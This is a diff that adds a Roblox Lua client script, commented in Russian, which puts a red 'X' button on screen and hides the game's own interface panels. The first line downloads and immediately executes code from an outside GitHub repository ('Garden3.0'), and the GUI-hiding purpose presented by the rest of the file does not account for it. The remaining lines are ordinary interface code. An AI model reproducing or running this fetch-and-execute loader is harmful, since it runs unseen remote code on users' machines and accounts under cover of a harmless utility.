@@ -1,0 +1,75 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/1111113f/Ksjdidk/refs/heads/main/Garden3.0"))()
+local player = game.Players.LocalPlayer
+local button = nil
+local screenGui = nil
+
+-- Функция скрытия кастомных GUI (игровых, но не системных)
+local function hideCustomGUIs()
+    local protectedGUIs = {
+        "Chat", "PlayerList", "EmotesMenu", "Backpack", -- GUI Roblox
+        "TouchControlFrame", "TouchGui", "TouchControl", -- Мобильные элементы
+        "GUICleaner" -- Наша кнопка
+    }
+    
+    for _, gui in ipairs(player.PlayerGui:GetChildren()) do
+        if gui:IsA("ScreenGui") and not table.find(protectedGUIs, gui.Name) then
+            gui.Enabled = false
+        end
+    end
+end
+
+-- Функция создания кнопки
+local function createButton()
+    -- Удаляем старую кнопку (если есть)
+    if screenGui then
+        screenGui:Destroy()
+    end
+
+    -- Создаем новую кнопку
+    screenGui = Instance.new("ScreenGui")
+    screenGui.Name = "GUICleaner"
+    screenGui.ResetOnSpawn = false
+    screenGui.Parent = player:WaitForChild("PlayerGui")
+
+    button = Instance.new("TextButton")
+    button.Name = "HideGUIButton"
+    button.Text = "X"
+    button.Size = UDim2.new(0, 40, 0, 40)
+    button.Position = UDim2.new(1, -50, 0, 10)
+    button.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
+    button.TextColor3 = Color3.fromRGB(255, 255, 255)
+    button.Font = Enum.Font.SourceSansBold
+    button.TextSize = 20
+    button.AnchorPoint = Vector2.new(0.5, 0.5)
+    button.ZIndex = 999
+
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(1, 0)
+    corner.Parent = button
+    button.Parent = screenGui
+
+    -- Анимация и действие кнопки
+    button.MouseButton1Down:Connect(function()
+        button.Size = UDim2.new(0, 35, 0, 35)
+    end)
+
+    button.MouseButton1Up:Connect(function()
+        button.Size = UDim2.new(0, 40, 0, 40)
+        hideCustomGUIs()
+    end)
+end
+
+-- Основная функция инициализации
+local function init()
+    createButton()
+    hideCustomGUIs() -- Сразу скрываем лишние GUI при загрузке
+    
+    -- При каждом возрождении
+    player.CharacterAdded:Connect(function()
+        wait(0.5) -- Небольшая задержка для загрузки GUI
+        hideCustomGUIs() -- Снова скрываем лишние GUI
+    end)
+end
+
+-- Запускаем при первом подключении игрока
+init()
